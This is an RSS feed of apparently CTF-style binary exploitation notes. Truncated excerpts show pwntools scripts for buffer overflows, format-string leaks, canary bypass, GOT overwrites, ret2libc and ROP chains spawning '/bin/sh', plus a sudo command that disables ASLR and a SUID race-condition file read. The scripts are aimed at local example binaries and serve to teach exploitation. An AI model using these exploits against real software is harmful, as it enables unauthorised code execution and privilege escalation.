<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Binary Exploitation on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/docs/hdks/binary-exploitation/</link>
    <description>Recent content in Binary Exploitation on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 17 Jan 2024 15:21:24 +0530</lastBuildDate>
    <atom:link href="https://documentnation.github.io/docs/hdks/binary-exploitation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Binary Exploitation with Buffer Overflow</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-buffer-overflow/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-buffer-overflow/</guid>
      <description>Investigation linkFunctions Lead to Buffer Overflow linkIf the binary uses the following functions, Buffer Overflow may occurs.&#xA;gets() fgets() scanf() sprintf() strcpy() strcat() Basic Buffer Overflow linkTry to find what values lead to segmentation fault.&#xA;python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*30)&amp;#39; | ./example python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*40)&amp;#39; | ./example python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*50)&amp;#39; | ./example ... Exploitation linkAbuse input/output by typing a lot of characters more than the program expects..&#xA;./example Type something: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Exploitation using Pwntools link #!</description>
    </item>
    <item>
      <title>Binary Exploitation with Format String</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-format-string/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-format-string/</guid>
      <description>Investigation linkIf a binary file contains the functionality which reads user input then outputs it, we can abuse format strings.&#xA;// example.c int main() { char buffer[12]; gets(buffer); printf(buffer); return 0; } For example, input %x as below, then we get the value of stack as hex representation.&#xA;./example # Input 1 (read value as hex) %x # output ad8c72a1 # Input 2 (read multiple values as hex) %x %x %x %x # output 78252078 0 ceddc980 447c8d80 0 # Input 3 (read offset values as hex) %1$x # output 2431 # Input 4 (read offset values as hex) %2$x # output 0 # Input 5 (read pointer address) %p # output 0x55821afca2a1 # Input 6 (read offset pointer address) %1$p # output 2431 Exploitation linkThis is an example of exploitation with format string.</description>
    </item>
    <item>
      <title>Binary Exploitation with ret2libc</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2libc/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2libc/</guid>
      <description>Exploitation link1. ASLR Bypass linkFirst check the ASLR in the machine.&#xA;cat /proc/sys/kernel/randomize_va_space If we get &amp;ldquo;2&amp;rdquo; as the result, the machine randomizes the address space so we cannot find the address of the system function. Thatâ€™s why we need to bypass ASLR to find the address of the function in libc.&#xA;To disable ASLR, run the following command if we can (because it requires sudo).&#xA;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 2.</description>
    </item>
    <item>
      <title>Pwntools Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/pwntools-cheat-sheet/</link>
      <pubDate>Fri, 28 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/pwntools-cheat-sheet/</guid>
      <description>from pwn import * # Enable logging context.log_level = &amp;#39;debug&amp;#39; # Load executable exe = ELF(&amp;#34;./example&amp;#34;) # Libc libc = exe.libc sh_addr = next(libc.search(b&amp;#34;/bin/sh&amp;#34;)) # Runtime variables context.arch = &amp;#34;amd64&amp;#34; context.binary = &amp;#34;./example&amp;#34; context.os = &amp;#34;linux&amp;#34; context.update(arch=&amp;#34;amd64&amp;#34;, os=&amp;#34;linux&amp;#34;) # Start process conn = process(&amp;#34;./example&amp;#34;) # local file conn = process(exe.path) # also we can specify the executable path conn = remote(&amp;#34;10.0.0.1&amp;#34;, &amp;#34;1337&amp;#34;) # remote connection # Receive data conn.recv() conn.</description>
    </item>
    <item>
      <title>Binary Exploitation with Race Conditions</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-race-conditions/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-race-conditions/</guid>
      <description>Abuse User Input Method linkIf the SUID binary waits for our input the function like getchar or scanf, we can manipulate the state for something while the binary is waiting for our input.&#xA;puts(&amp;#34;Enter: &amp;#34;); getchar(); Here is an example for reading arbitrary file which cannot be read by current user.&#xA;Exploitation linkAssume the binary reads contents of the file which is passed in the argument as below.&#xA;./suid_binary_to_read_file &amp;lt;file_path&amp;gt; First off, create arbitrary file to read, then execute the binary with passing the file.</description>
    </item>
    <item>
      <title>Binary Exploitation with Time Guessing</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-time-guessing/</link>
      <pubDate>Wed, 01 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-time-guessing/</guid>
      <description>Investigation link ./example Guess the number: 1111 You losed. The correct answer is 1475693029 Guess the number: 12345678 You losed. The correct answer is 8246712747 If we find a binary that asks us to guess the correct time (or time-base number), we can bypass it using a Pipe in command line.&#xA;Exploitation link # tr -dc &amp;#39;0-9&amp;#39;: Extract the correct number provided by the binary. echo 1234 | ./example | tr -dc &amp;#39;0-9&amp;#39; | .</description>
    </item>
    <item>
      <title>Binary Exploitation with Canary Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-canary-bypass/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-canary-bypass/</guid>
      <description>Exploitation link from pwn import * import re context.update(arch=&amp;#34;amd64&amp;#34;, os=&amp;#34;linux&amp;#34;) filepath = &amp;#34;./example&amp;#34; elf = context.binary = ELF(filepath) p = process(filepath) # p = remote(&amp;#39;example.com&amp;#39;, &amp;#39;1337&amp;#39;) for remote connection # We need to find the stack canary. This address ends with &amp;#34;00&amp;#34;. # To find it, execute p.sendline(b&amp;#34;%p %p %p %p ...&amp;#34;). p.sendline(b&amp;#34;%10$p %13$p&amp;#34;) p.recvuntil(b&amp;#34;result: &amp;#34;) leaked = p.recvline().split() print(leaked) base = int(leaked[0], 16) - 0xa90 canary = int(leaked[1], 16) elf.</description>
    </item>
    <item>
      <title>Binary Exploitation with GOT</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-got/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-got/</guid>
      <description>GOT Overriding link from pwn import * context.update(arch=&amp;#34;amd64&amp;#34;, os=&amp;#34;linux&amp;#34;) filepath = &amp;#34;./example&amp;#34; elf = context.binary = ELF(filepath) p = process(filepath) # p = remote(&amp;#39;example.com&amp;#39;, &amp;#39;1337&amp;#39;) p.clean() p.sendline() p.clean() payload = fmtstr_payload(10, {elf.got[&amp;#39;puts&amp;#39;] : elf.sym[&amp;#39;holidays&amp;#39;]}) p.sendline(payload) p.interactive() </description>
    </item>
    <item>
      <title>Binary Exploitation with ret2plt</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2plt/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2plt/</guid>
      <description>No content yet.</description>
    </item>
    <item>
      <title>Binary Exploitation with ROP</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-rop/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-rop/</guid>
      <description>Exploitation linkPwntools can build ROP chains so we&amp;rsquo;ll use it for exploitation.&#xA;from pwn import * elf = context.binary = ELF(&amp;#39;./example&amp;#39;) libc = elf.libc p = process() # get the base address p.recvuntil(&amp;#39;Enter name: &amp;#39;) base_addr = int(p.recvline(), 16) # set our libc address according to the base address libc.address = base_addr - libc.sym[&amp;#39;system&amp;#39;] log.success(&amp;#39;LIBC base: {}&amp;#39;.format(hex(libc.address))) # get location of binsh from libc binsh = next(libc.search(b&amp;#39;/bin/sh&amp;#39;)) # build the rop chain rop = ROP(libc) rop.</description>
    </item>
  </channel>
</rss>
